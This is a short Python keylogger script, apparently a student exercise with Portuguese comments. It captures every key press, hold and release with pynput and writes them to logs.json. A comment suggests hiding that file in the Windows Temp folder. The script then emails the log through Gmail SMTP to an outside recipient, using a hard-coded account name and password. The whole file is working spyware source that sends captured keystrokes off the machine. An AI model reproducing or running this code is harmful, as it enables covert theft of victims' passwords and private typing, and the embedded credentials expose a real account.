from pynput import keyboard
import json
from threading import Timer
import smtplib
from email.message import EmailMessage

key_list = []
x = False  # Value to if held
json_file_path = 'logs.json'


# Trocar para C:\Windows\Temp\logs.json
def update_json_file(key_list):
    with open(json_file_path, '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)


def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})  # f'Key {key} pressed'
    update_json_file(key_list)


def on_release(key):
    global x, key_list
    key_list.append({'Released': f'{key}'})  # f'Key {key} released'
    if x == True:
        x = False
    update_json_file(key_list)


def send_email(email, password, receiver, subject = '(no subject)'):
    msg = EmailMessage()
    msg['Subject'] = subject
    msg['To'] = receiver

    with open(json_file_path) as myfile:
        data = myfile.read()
        msg.set_content(data)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(email, password)
        server.send_message(msg)

    print("Email sent!")


print(
    "[+] Keylogger funcionando com sucesso!\n[!] Salvando dados no arquivo 'logs.json'"
)

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    Timer(5, listener.stop).start()
    listener.join()
    print("[-] Keylogger finalizado!")

send_email('mcpozebaiano@gmail.com', 'mcpozedorodo',
           'd.lima@aln.senaicimatec.edu.br', 'keylogger')
